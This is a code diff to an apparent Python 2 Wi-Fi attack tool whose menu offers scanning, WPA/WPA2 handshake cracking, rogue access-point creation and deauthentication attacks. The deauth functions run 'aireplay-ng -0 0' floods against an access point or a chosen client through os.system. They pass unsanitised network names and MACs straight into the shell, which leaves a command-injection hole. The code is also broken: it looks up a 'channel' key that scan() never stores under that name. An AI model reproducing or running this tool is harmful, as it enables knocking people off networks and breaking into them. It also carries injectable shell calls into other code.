@@ -13,8 +13,8 @@ redes = []
 
 
 def menu():
-	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect \n3: Capture traffic\n4: Crack WPA/WPA2 traffic file \n5: Deauth AP \n6: Deauth specific client \n7: Create AP\n')
-	if opt_ == "1":
+	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect \n3: Capture traffic\n4: Crack WPA/WPA2 traffic file \n5: Deauth attack \n6: Create AP\n')
+	if   opt_ == "1":
 		scan()
 	elif opt_=="2":
 		connect()
@@ -23,10 +23,8 @@ def menu():
 	elif opt_=="4":
 		crack_wpa()
 	elif opt_=="5":
-		deauth_ap()
+		deauth()
 	elif opt_=="6":
-		deauth_client()
-	elif opt_=="7":
 		create_ap()
 	else:
 		print "Unknown option"
@@ -69,9 +67,11 @@ def create_ap():
 
 
 def deauth_client():
-	ap_mac = raw_input("AP MAC:")
-	essid=raw_input("Network name:")
-	channel=raw_input("Channel:")
+	id_red = raw_input('Select id: ')
+	red=redes[int(id_red)]
+	ap_mac=red.get("mac")
+	essid=red.get("ssid")
+	channel=red.get("channel")
 	client_mac = raw_input("Client MAC:")
 	os.system("sudo airmon-ng check kill")
 	os.system("sudo airmon-ng start "+interfaz+" "+channel)
@@ -81,14 +81,24 @@ def deauth_client():
 
 
 def deauth_ap():
-	ap_mac = raw_input("AP MAC:")
-	essid=raw_input("Network name:")
-	channel=raw_input("Channel:")
+	id_red = raw_input('Select id: ')
+	red=redes[int(id_red)]
+	ap_mac=red.get("mac")
+	essid=red.get("ssid")
+	channel=red.get("channel")
 	os.system("sudo airmon-ng check kill")
 	os.system("sudo airmon-ng start "+interfaz+" "+channel)
 	interfaz_mon = raw_input("Monitorization interface:")
 	os.system("sudo ifconfig "+interfaz+" down")
 	os.system("aireplay-ng -0 0 -a "+ap_mac+" -e "+essid+" "+interfaz_mon)
+
+
+def deauth():
+	deauth_type=raw_input("1: AP deauth \n2: Client deauth\n")
+	if deauth_type == "1":
+		deauth_ap()
+	else:
+		deauth_client()
 
 
 def crack_wpa():
@@ -106,7 +116,7 @@ def capture_traffic():
 
 def connect():
 	id_red = raw_input('Select id: ')
-	essid=redes[int(id_red)][0]
+	essid=redes[int(id_red)].get("ssid")
 	conf_file="temp/supp.conf"
 
 	is_psk = raw_input("Is WPA-PSK? (y/N)")
@@ -133,6 +143,7 @@ def scan():
 	print "\nScanning...\n"
 	while len(list_) == 0:
 		list_ = Cell.all(interfaz)
+	count = 0
 	for i in list_:
 		ssid = i.ssid
 		mac = i.address
@@ -143,12 +154,12 @@ def scan():
 			cifrado = i.encryption_type
 		else:
 			cifrado = "None"
-		redes.append( ( str(ssid), str(cifrado), str(mac), str(frecuencia), str(canal), str(max_rate) ) )
-	count = 0
-	for red in redes:
-		print "- ", red[0],"(ID = ",count,")"
-		print "   Info: ("+red[1]+", "+red[2]+", "+red[3]+", "+red[4]+", "+red[5]+")"
+		redes.append( { "id":str(count), "ssid": str(ssid), "cifrado": str(cifrado), "mac": str(mac), "frecuencia": str(frecuencia), "canal": str(canal), "rate": str(max_rate) } )
 		count+=1
+	for red in redes:
+		print "- ", red.get("ssid"),"(ID = ",red.get("id"),")"
+		print "   MAC:"+red.get("mac")+"	Cypher:"+red.get("cifrado")+"\n   Canal:"+red.get("canal")+"("+red.get("frecuencia")+")	Rate:"+red.get("rate")
+		print "---------------------------------------------------------"
 	menu()
 
 
